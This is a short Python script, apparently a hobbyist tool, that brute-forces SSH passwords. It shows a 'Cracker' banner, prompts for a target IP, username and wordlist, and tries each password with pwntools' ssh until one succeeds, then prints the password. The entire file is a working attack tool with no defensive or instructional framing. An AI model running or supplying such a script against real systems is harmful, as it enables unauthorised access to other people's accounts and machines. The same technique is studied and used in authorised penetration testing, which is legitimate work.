import paramiko.ssh_exception 
import paramiko 
from pwn import * 
import sys 
import pyfiglet 
figlet = pyfiglet.figlet_format("Cracker") 
print(figlet)
target_ip = input("Enter target ip: ")
username = input("What is your target username: ")
use_wordlist = input("Do you want to use existing wordlist y/n: ")
if use_wordlist == "y": 
    wordlist = input("Wordlist name: ")
if use_wordlist == "n": 
    sys.exit() 
with open(wordlist, "r") as password_file: 
    for password in password_file: 
        password = password.strip("\n")
        try: 
            print(f"[*] Trying password {password}")
            response = ssh(host=target_ip, user=username, password=password, timeout=10)
            if response.connected():
                print(f"[*] The password is {password}")
                response.close()
                break
            else: 
                print("[*] Invalid password!")
        except paramiko.ssh_exception.AuthenticationException:
            continue 